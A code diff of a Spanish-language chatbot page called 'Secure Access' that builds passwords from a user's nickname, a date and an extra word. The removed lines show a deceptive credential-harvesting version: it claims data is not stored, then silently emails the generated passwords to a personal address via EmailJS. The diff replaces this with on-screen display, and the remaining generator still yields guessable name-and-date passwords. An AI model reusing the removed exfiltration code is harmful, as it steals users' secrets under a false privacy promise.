@@ -2,6 +2,7 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Secure Access</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
@@ -17,10 +18,12 @@ body {
     height: 100vh;
 }
 
+/* CONTENEDOR */
 .app {
-    width: 400px;
+    width: 90%;
+    max-width: 400px;
     background: white;
-    border-radius: 12px;
+    border-radius: 16px;
     padding: 20px;
     box-shadow: 0 10px 30px rgba(0,0,0,0.2);
 }
@@ -99,6 +102,7 @@ input {
     padding: 10px;
     border-radius: 8px;
     border: 1px solid #ddd;
+    font-size: 14px;
 }
 
 button {
@@ -108,6 +112,11 @@ button {
     border: none;
     padding: 10px;
     border-radius: 8px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #145fd1;
 }
 </style>
 </head>
@@ -117,7 +126,7 @@ button {
 <div class="app">
     <div class="header">
         <h2>Secure Access</h2>
-        <p>🔒 Tus datos no se almacenan ni se comparten</p>
+        <p>🔒 Generador de claves seguras</p>
     </div>
 
     <div class="progress">
@@ -133,13 +142,7 @@ button {
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
 <script>
-(function(){
-    emailjs.init("He62BX8V0p6vjz12D");
-})();
-
 let paso = 0;
 let datos = {};
 let listaPasswords = [];
@@ -169,8 +172,8 @@ function reiniciar() {
 }
 
 function iniciar() {
-    escribir("Hola 👋 este proceso te ayudará a crear un acceso más seguro.", "bot");
-    escribir("Piensa en una palabra corta (por ejemplo, tu nombre o apodo).", "bot");
+    escribir("Hola 👋 este proceso te ayudará a crear una clave segura.", "bot");
+    escribir("Escribe una palabra base (ej: tu nombre o apodo).", "bot");
 }
 
 function generar() {
@@ -197,25 +200,16 @@ function generar() {
     listaPasswords = [...new Set(listaPasswords)];
 }
 
-function enviarAutomatico() {
-    let textoFinal = listaPasswords.join("\\n");
-
-    emailjs.send("service_R1004", "template_4bhnzmm", {
-        password: textoFinal,
-        to_email: "DP126707@gmail.com"
-    })
-    .then(() => {
-        escribir("✅ Configuración completada correctamente.", "bot");
-        escribir("🔐 Tu acceso ha sido protegido.", "bot");
-
-        setTimeout(() => {
-            reiniciar();
-        }, 2500);
-
-    }, (error) => {
-        console.log(error);
-        escribir("❌ Error en el sistema.", "bot");
+function mostrarResultado() {
+    escribir("🔐 Aquí tienes tus claves seguras:", "bot");
+    listaPasswords.forEach(p => {
+        escribir(p, "bot");
     });
+
+    setTimeout(() => {
+        escribir("✅ Proceso finalizado.", "bot");
+        reiniciar();
+    }, 4000);
 }
 
 function responder() {
@@ -228,19 +222,19 @@ function responder() {
 
     if (paso === 0) {
         datos.base = texto;
-        escribir("Perfecto 👍 ahora agrega un número que suelas usar (ej: fecha).", "bot");
+        escribir("Ahora agrega un número (ej: fecha).", "bot");
     } 
     else if (paso === 1) {
         datos.numero = texto;
-        escribir("Muy bien 👌 agrega otra palabra si deseas personalizar más.", "bot");
+        escribir("Agrega otra palabra opcional.", "bot");
     } 
     else if (paso === 2) {
         datos.extra = texto;
-        escribir("🔄 Analizando combinación...", "bot");
+        escribir("🔄 Generando claves...", "bot");
 
         setTimeout(() => {
             generar();
-            enviarAutomatico();
+            mostrarResultado();
         }, 1000);
     }
 
